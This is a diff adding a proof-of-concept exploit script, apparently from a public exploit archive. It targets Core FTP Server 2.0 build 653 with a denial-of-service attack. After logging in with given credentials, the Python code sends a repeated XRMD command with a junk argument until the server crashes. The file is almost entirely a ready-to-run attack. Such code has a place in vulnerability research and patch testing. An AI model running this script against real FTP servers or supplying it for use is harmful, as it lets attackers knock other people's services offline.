@@ -1,0 +1,63 @@
+# Exploit Title: Core FTP 2.0 - 'XRMD' Denial of Service (PoC)
+# Date: 2018-07-24
+# Exploit Author: Erik David Martin
+# Vendor Homepage: http://www.coreftp.com/
+# Software Link: http://www.coreftp.com/server/download/CoreFTPServer.exe
+# Version: Version 2.0, build 653, 32-bit
+# Tested on: Windows XP Professional, Version 2002, Service Pack 3
+# CVE: N/A
+
+# Proof of concept:
+# Create a new domain and set IP address
+# Use the default certificate by Core FTP Server
+# Set base directory
+# Create an anonymous user (anonymous:anonymous) for example
+# Set a path for the user
+# Start the server
+# Run exploit: python exploit.py *target ip* anonymous anonymous
+# Watch the server crash...
+# The exploit will work for any user, and not just anonymous
+
+import sys
+import socket
+
+try:
+	host = sys.argv[1]
+	username = sys.argv[2]
+	password = sys.argv[3]
+except:
+	print("Usage: exploit.py *target ip* *username* *password*")
+	sys.exit()
+
+mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #
+mysocket.settimeout(2)
+
+try:
+	mysocket.connect((host,21))
+	mysocket.recv(1024)
+	print("\n[+] Connected\n")
+except:
+	print("[-] Error! Could not connect to target")
+	sys.exit()
+
+junk = ("asO8M.lFX[Gq<4<p(.P5eMLv]\2!G8jB_6Gx[I;I!aYa#oAi@kI<f.QFwkSBiQ,!")
+
+try:
+	mysocket.send("USER " + username + "\r\n")
+	mysocket.recv(1024)
+	mysocket.send("PASS " + password + "\r\n")
+	mysocket.recv(1024)
+	print("[+] Logged in as " + username)
+except:
+	print("[-] Error! Could not log in as " + username)
+	sys.exit()
+
+print("[+] Sending malicious request")
+
+while True:
+	try:
+		mysocket.send("XRMD " + junk + "\r\n")
+		mysocket.recv(1024)
+	except:
+		print("[+] Target is down\n")
+		sys.exit()
